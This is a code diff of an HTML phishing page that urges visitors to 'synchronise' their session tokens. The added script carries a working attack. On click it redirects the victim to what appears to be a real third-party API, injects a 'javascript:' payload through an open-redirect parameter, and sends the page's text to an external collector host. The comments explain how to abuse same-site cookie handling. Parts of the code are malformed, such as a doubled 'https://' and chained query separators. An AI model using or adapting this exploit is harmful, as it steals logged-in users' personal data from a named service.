@@ -2,23 +2,43 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Synchronizing Account...</title>
+    <title>Synchronize Session Profile</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background: #fafafa; }
+        .box { display: inline-block; padding: 40px; background: white; border: 1px solid #e0e0e0; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+        .btn { background: #007bff; color: white; padding: 14px 28px; font-size: 16px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; font-weight: bold; }
+        .btn:hover { background: #0056b3; }
+    </style>
 </head>
 <body>
-    <h2>Click below to verify your session tokens</h2>
-    <button id="exploitBtn">Verify Session</button>
 
-    <script>
-        document.getElementById('exploitBtn').addEventListener('click', () => {
-            // 1. Target the URL parameter that handles the client-side redirect
-            // 2. Inject a payload that reads the text, base64 encodes it, and sends it to Collaborator via window.location
-            const targetUrl = "https://ocean.medishout.co.uk/v1/users/me/?platform=web" + encodeURIComponent(
-                "javascript:void(window.location='https://n2qdxml6rggzvw93tatthhg11s7kvajz.k.e-secureapp.com)"
-            );
+<div class="box">
+    <h2>Account Synchronisation Required</h2>
+    <p>Click the action button below to refresh your tokens securely.</p>
+    <br>
+    <button id="exploitBtn" class="btn">Synchronize Session Now</button>
+</div>
 
-            // Trigger top-level navigation so the SameSite=Lax cookie passes cleanly
-            window.location.href = targetUrl;
-        });
-    </script>
+<script>
+    document.getElementById('exploitBtn').addEventListener('click', () => {
+        // 1. Establish your active exfiltration receiver endpoint
+        const collaboratorUrl = "https://8eny97xr31sk7hlo5v5et2smddj57xvm.k.e-secureapp.com";
+
+        // 2. Build the precise 'javascript:' execution payload (No 'web' prefix)
+        // It grabs the target's DOM text, base64 encodes it, and pushes the window out to your listener
+        const jsPayload = "javascript:void(window.location='" + collaboratorUrl + "'+btoa(unescape(encodeURIComponent(document.body.innerText))))";
+
+        // 3. Define the main target endpoint URL
+        const baseTargetUrl = "https://https://ocean.medishout.co.uk/v1/users/me/?platform=web";
+
+        // 4. Map the payload to the parameter handling your open redirect loop.
+        // Change 'redirect' below if the application uses a different token like 'next', 'url', or 'callback'
+        const finalizedTarget = baseTargetUrl + "?redirect=" + encodeURIComponent(jsPayload);
+
+        // 5. Fire a user-initiated top-level GET navigation to cleanly attach the SameSite=Lax cookie
+        window.location.href = finalizedTarget;
+    });
+</script>
+
 </body>
 </html>
